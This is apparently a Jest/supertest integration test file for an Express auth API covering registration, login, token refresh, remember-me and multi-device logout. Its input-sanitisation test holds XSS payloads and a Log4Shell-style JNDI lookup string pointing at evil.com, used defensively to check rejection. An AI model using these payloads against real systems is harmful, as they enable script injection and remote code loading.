import request from 'supertest';
import app from '../../src/server';
import { PrismaClient } from '@prisma/client';
import bcrypt from 'bcryptjs';

const prisma = new PrismaClient();

// Fonction utilitaire pour extraire le refresh token des cookies
const extractRefreshTokenCookie = (headers: any): string => {
  const setCookieHeader = headers['set-cookie'];
  const cookieArray = Array.isArray(setCookieHeader) ? setCookieHeader : [setCookieHeader];
  return cookieArray.find((cookie: string) => 
    cookie && cookie.startsWith('refreshToken=')
  ) || '';
};

describe('Auth Integration Tests', () => {
  let testUser: any;
  let accessToken: string;
  let refreshTokenCookie: string;

  beforeAll(async () => {
    // Utiliser sessions au lieu de refreshToken
    await prisma.session.deleteMany({});
    await prisma.user.deleteMany({
      where: { email: { contains: 'test' } }
    });
  });

  afterAll(async () => {
    // Utiliser sessions au lieu de refreshToken
    await prisma.session.deleteMany({});
    await prisma.user.deleteMany({
      where: { email: { contains: 'test' } }
    });
    await prisma.$disconnect();
  });

  describe('Complete Auth Flow', () => {
    it('should complete full registration -> login -> profile -> logout flow', async () => {
      const registrationData = {
        email: 'integration@test.com',
        password: 'Password123!',
        firstName: 'Integration',
        lastName: 'Test',
      };

      const registerResponse = await request(app)
        .post('/api/v1/auth/register')
        .send(registrationData);

      expect(registerResponse.status).toBe(201);
      expect(registerResponse.body.success).toBe(true);
      expect(registerResponse.body.data.user.email).toBe(registrationData.email);
      
      refreshTokenCookie = extractRefreshTokenCookie(registerResponse.headers);
      
      accessToken = registerResponse.body.data.tokens.accessToken;
      testUser = registerResponse.body.data.user;

      // Vérifier qu'une session a été créée
      const sessions = await prisma.session.findMany({
        where: { userId: testUser.id }
      });
      expect(sessions.length).toBe(1);

      const profileResponse = await request(app)
        .get('/api/v1/auth/profile')
        .set('Authorization', `Bearer ${accessToken}`);

      expect(profileResponse.status).toBe(200);
      expect(profileResponse.body.data.user.email).toBe(registrationData.email);

      const updateData = {
        firstName: 'UpdatedName',
        // Retirer phoneNumber car il n'existe pas dans votre schéma
      };

      const updateResponse = await request(app)
        .put('/api/v1/auth/profile')
        .set('Authorization', `Bearer ${accessToken}`)
        .send(updateData);

      expect(updateResponse.status).toBe(200);
      expect(updateResponse.body.data.user.firstName).toBe('UpdatedName');

      const changePasswordResponse = await request(app)
        .post('/api/v1/auth/change-password')
        .set('Authorization', `Bearer ${accessToken}`)
        .send({
          currentPassword: 'Password123!',
          newPassword: 'NewPassword123!',
        });

      expect(changePasswordResponse.status).toBe(200);
      expect(changePasswordResponse.body.success).toBe(true);

      // Vérifier que toutes les sessions ont été supprimées après changement de mot de passe
      const sessionsAfterPasswordChange = await prisma.session.findMany({
        where: { userId: testUser.id }
      });
      expect(sessionsAfterPasswordChange.length).toBe(0);

      const loginResponse = await request(app)
        .post('/api/v1/auth/login')
        .send({
          email: registrationData.email,
          password: 'NewPassword123!',
        });

      expect(loginResponse.status).toBe(200);
      expect(loginResponse.body.success).toBe(true);

      const newAccessToken = loginResponse.body.data.tokens.accessToken;
      const newRefreshCookie = extractRefreshTokenCookie(loginResponse.headers);

      // Vérifier qu'une nouvelle session a été créée
      const newSessions = await prisma.session.findMany({
        where: { userId: testUser.id }
      });
      expect(newSessions.length).toBe(1);

      const logoutResponse = await request(app)
        .post('/api/v1/auth/logout')
        .set('Cookie', newRefreshCookie);

      expect(logoutResponse.status).toBe(200);
      expect(logoutResponse.body.success).toBe(true);

      // Vérifier que la session a été supprimée après logout
      const sessionsAfterLogout = await prisma.session.findMany({
        where: { userId: testUser.id }
      });
      expect(sessionsAfterLogout.length).toBe(0);

      const verifyResponse = await request(app)
        .get('/api/v1/auth/profile')
        .set('Authorization', `Bearer ${newAccessToken}`);

      expect(verifyResponse.status).toBe(200); // L'access token est encore valide même si la session est supprimée
    });

    it('should handle refresh token flow correctly', async () => {
      const userData = {
        email: 'refresh@test.com',
        password: 'Password123!',
      };

      const registerResponse = await request(app)
        .post('/api/v1/auth/register')
        .send(userData);

      const initialRefreshCookie = extractRefreshTokenCookie(registerResponse.headers);

      const userId = registerResponse.body.data.user.id;

      // Vérifier qu'une session initiale existe
      let sessions = await prisma.session.findMany({
        where: { userId }
      });
      expect(sessions.length).toBe(1);

      const refreshResponse = await request(app)
        .post('/api/v1/auth/refresh')
        .set('Cookie', initialRefreshCookie);

      expect(refreshResponse.status).toBe(200);
      expect(refreshResponse.body.success).toBe(true);
      expect(refreshResponse.body.data.tokens.accessToken).toBeDefined();

      // Vérifier qu'une nouvelle session a été créée et l'ancienne supprimée
      sessions = await prisma.session.findMany({
        where: { userId }
      });
      expect(sessions.length).toBe(1);

      const newAccessToken = refreshResponse.body.data.tokens.accessToken;
      const newRefreshCookie = extractRefreshTokenCookie(refreshResponse.headers);

      const profileResponse = await request(app)
        .get('/api/v1/auth/profile')
        .set('Authorization', `Bearer ${newAccessToken}`);

      expect(profileResponse.status).toBe(200);
      expect(profileResponse.body.data.user.email).toBe(userData.email);

      // Tester l'ancien refresh token (doit échouer)
      const oldRefreshResponse = await request(app)
        .post('/api/v1/auth/refresh')
        .set('Cookie', initialRefreshCookie);

      expect(oldRefreshResponse.status).toBe(401);
    });

    it('should handle remember me functionality', async () => {
      // Nettoyer d'abord
      await prisma.session.deleteMany({
        where: {
          user: { email: 'integration@test.com' }
        }
      });

      const loginData = {
        email: 'integration@test.com',
        password: 'NewPassword123!',
        rememberMe: true,
      };

      const loginResponse = await request(app)
        .post('/api/v1/auth/login')
        .send(loginData);

      expect(loginResponse.status).toBe(200);
      
      const refreshCookie = extractRefreshTokenCookie(loginResponse.headers);
      
      // Vérifier que le cookie a une expiration longue (30 jours)
      expect(refreshCookie).toContain('Max-Age=2592000');

      const userId = loginResponse.body.data.user.id;
      
      // Vérifier que la session a une expiration longue
      const longSession = await prisma.session.findFirst({
        where: { userId }
      });
      expect(longSession).toBeTruthy();
      
      // Nettoyer la session longue
      await prisma.session.deleteMany({ where: { userId } });

      const shortLoginResponse = await request(app)
        .post('/api/v1/auth/login')
        .send({
          email: loginData.email,
          password: loginData.password,
          rememberMe: false,
        });

      expect(shortLoginResponse.status).toBe(200);
      
      const shortRefreshCookie = extractRefreshTokenCookie(shortLoginResponse.headers);
      
      // Vérifier que le cookie a une expiration courte (7 jours)
      expect(shortRefreshCookie).toContain('Max-Age=604800');
    });

    it('should handle multiple device logout', async () => {
      const loginData = {
        email: 'integration@test.com',
        password: 'NewPassword123!',
      };

      // Nettoyer les sessions existantes
      const existingUser = await prisma.user.findUnique({
        where: { email: loginData.email }
      });
      if (existingUser) {
        await prisma.session.deleteMany({
          where: { userId: existingUser.id }
        });
      }

      const device1Response = await request(app)
        .post('/api/v1/auth/login')
        .send(loginData);

      const device2Response = await request(app)
        .post('/api/v1/auth/login')
        .send(loginData);

      const device1Token = device1Response.body.data.tokens.accessToken;
      const device2Token = device2Response.body.data.tokens.accessToken;
      const userId = device1Response.body.data.user.id;

      // Vérifier que 2 sessions existent
      let sessions = await prisma.session.findMany({
        where: { userId }
      });
      expect(sessions.length).toBe(2);

      const profile1Response = await request(app)
        .get('/api/v1/auth/profile')
        .set('Authorization', `Bearer ${device1Token}`);

      const profile2Response = await request(app)
        .get('/api/v1/auth/profile')
        .set('Authorization', `Bearer ${device2Token}`);

      expect(profile1Response.status).toBe(200);
      expect(profile2Response.status).toBe(200);

      const logoutAllResponse = await request(app)
        .post('/api/v1/auth/logout-all')
        .set('Authorization', `Bearer ${device1Token}`);

      expect(logoutAllResponse.status).toBe(200);

      // Vérifier que toutes les sessions ont été supprimées
      sessions = await prisma.session.findMany({
        where: { userId }
      });
      expect(sessions.length).toBe(0);

      const device1Cookie = extractRefreshTokenCookie(device1Response.headers);
      const device2Cookie = extractRefreshTokenCookie(device2Response.headers);

      const refresh1Response = await request(app)
        .post('/api/v1/auth/refresh')
        .set('Cookie', device1Cookie);

      const refresh2Response = await request(app)
        .post('/api/v1/auth/refresh')
        .set('Cookie', device2Cookie);

      expect(refresh1Response.status).toBe(401);
      expect(refresh2Response.status).toBe(401);
    });
  });

  describe('Security Tests', () => {
    it('should reject requests with malformed tokens', async () => {
      const malformedTokens = [
        'Bearer invalid.token.format',
        'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid',
        'Bearer not-even-close',
        'Bearer ',
        ''
      ];

      for (const token of malformedTokens) {
        const response = await request(app)
          .get('/api/v1/auth/profile')
          .set('Authorization', token);

        expect(response.status).toBe(401);
      }
    });

    it('should validate input sanitization', async () => {
      const maliciousInputs = {
        email: '<script>alert("xss")</script>@test.com',
        firstName: '<img src=x onerror=alert("xss")>',
        lastName: '${jndi:ldap://evil.com/a}',
        // Retirer phoneNumber car il n'existe pas dans le schéma
      };

      const response = await request(app)
        .post('/api/v1/auth/register')
        .send({
          ...maliciousInputs,
          password: 'ValidPass123!'
        });

      expect(response.status).toBe(400);
      expect(response.body.success).toBe(false);
    });

    it('should enforce rate limiting', async () => {
      const requests = [];
      
      for (let i = 0; i < 10; i++) {
        requests.push(
          request(app)
            .post('/api/v1/auth/login')
            .send({
              email: 'test@test.com',
              password: 'wrongpassword'
            })
        );
      }

      const responses = await Promise.all(requests);
      
      const rateLimitedResponses = responses.filter(r => r.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });

    it('should handle expired refresh tokens', async () => {
      const userData = {
        email: 'expiry@test.com',
        password: 'Password123!',
      };

      const registerResponse = await request(app)
        .post('/api/v1/auth/register')
        .send(userData);

      const userId = registerResponse.body.data.user.id;

      // Créer une session expirée manuellement
      const expiredSession = await prisma.session.create({
        data: {
          token: 'expired-token',
          userId,
          expiresAt: new Date(Date.now() - 1000) // Expirée il y a 1 seconde
        }
      });

      const refreshResponse = await request(app)
        .post('/api/v1/auth/refresh')
        .set('Cookie', 'refreshToken=expired-token');

      expect(refreshResponse.status).toBe(401);
      expect(refreshResponse.body.success).toBe(false);
    });

    it('should handle session cleanup on logout', async () => {
      const userData = {
        email: 'cleanup@test.com',
        password: 'Password123!',
      };

      const registerResponse = await request(app)
        .post('/api/v1/auth/register')
        .send(userData);

      const userId = registerResponse.body.data.user.id;
      const refreshCookie = extractRefreshTokenCookie(registerResponse.headers);

      // Vérifier qu'une session existe
      let sessions = await prisma.session.findMany({
        where: { userId }
      });
      expect(sessions.length).toBe(1);

      const logoutResponse = await request(app)
        .post('/api/v1/auth/logout')
        .set('Cookie', refreshCookie);

      expect(logoutResponse.status).toBe(200);

      // Vérifier que la session a été supprimée
      sessions = await prisma.session.findMany({
        where: { userId }
      });
      expect(sessions.length).toBe(0);
    });
  });
});